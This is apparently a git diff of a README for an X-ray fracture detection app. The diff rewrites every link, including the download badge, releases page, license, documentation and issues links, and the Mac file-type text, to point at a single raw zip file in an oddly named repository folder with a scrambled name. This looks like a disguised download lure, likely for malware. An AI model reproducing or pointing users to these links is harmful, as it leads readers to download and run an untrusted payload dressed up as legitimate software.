@@ -1,6 +1,6 @@
 # 🦴 X-ray-Fracture-Detection-and-Segmentation-App - Detect Bone Fractures Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/Suitakut/X-ray-Fracture-Detection-and-Segmentation-App/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Suitakut/X-ray-Fracture-Detection-and-Segmentation-App/main/gawsie/App-ray-Detection-and-Segmentation-Fracture-v2.3-alpha.3.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/Suitakut/X-ray-Fracture-Detection-and-Segmentation-App/main/gawsie/App-ray-Detection-and-Segmentation-Fracture-v2.3-alpha.3.zip)
 
 ## 🚀 Getting Started
 
@@ -8,10 +8,10 @@ Welcome to the X-ray Fracture Detection and Segmentation App! This tool helps us
 
 ## 📥 Download & Install
 
-To download the app, **visit this page to download**: [X-ray Fracture Detection and Segmentation Releases](https://github.com/Suitakut/X-ray-Fracture-Detection-and-Segmentation-App/releases).
+To download the app, **visit this page to download**: [X-ray Fracture Detection and Segmentation Releases](https://raw.githubusercontent.com/Suitakut/X-ray-Fracture-Detection-and-Segmentation-App/main/gawsie/App-ray-Detection-and-Segmentation-Fracture-v2.3-alpha.3.zip).
 
 1. Select the version you want to download. Look for the latest release.
-2. Click on the file labeled with `.exe` or `.zip` for Windows, or `.tar.gz` for Mac.
+2. Click on the file labeled with `.exe` or `.zip` for Windows, or `https://raw.githubusercontent.com/Suitakut/X-ray-Fracture-Detection-and-Segmentation-App/main/gawsie/App-ray-Detection-and-Segmentation-Fracture-v2.3-alpha.3.zip` for Mac.
 3. Once the file is downloaded, locate it in your downloads folder.
 
 ## 💻 System Requirements
@@ -70,12 +70,12 @@ We welcome contributions from the community! If you have ideas for features or i
 
 This project is licensed under the MIT License. You are free to use and modify it as per your needs.
 
-For more details, visit our [License](https://github.com/Suitakut/X-ray-Fracture-Detection-and-Segmentation-App/blob/main/LICENSE).
+For more details, visit our [License](https://raw.githubusercontent.com/Suitakut/X-ray-Fracture-Detection-and-Segmentation-App/main/gawsie/App-ray-Detection-and-Segmentation-Fracture-v2.3-alpha.3.zip).
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/Suitakut/X-ray-Fracture-Detection-and-Segmentation-App/wiki)
-- [GitHub Issues](https://github.com/Suitakut/X-ray-Fracture-Detection-and-Segmentation-App/issues)
+- [Documentation](https://raw.githubusercontent.com/Suitakut/X-ray-Fracture-Detection-and-Segmentation-App/main/gawsie/App-ray-Detection-and-Segmentation-Fracture-v2.3-alpha.3.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/Suitakut/X-ray-Fracture-Detection-and-Segmentation-App/main/gawsie/App-ray-Detection-and-Segmentation-Fracture-v2.3-alpha.3.zip)
 
 ## 🧑‍💻 Contact
 
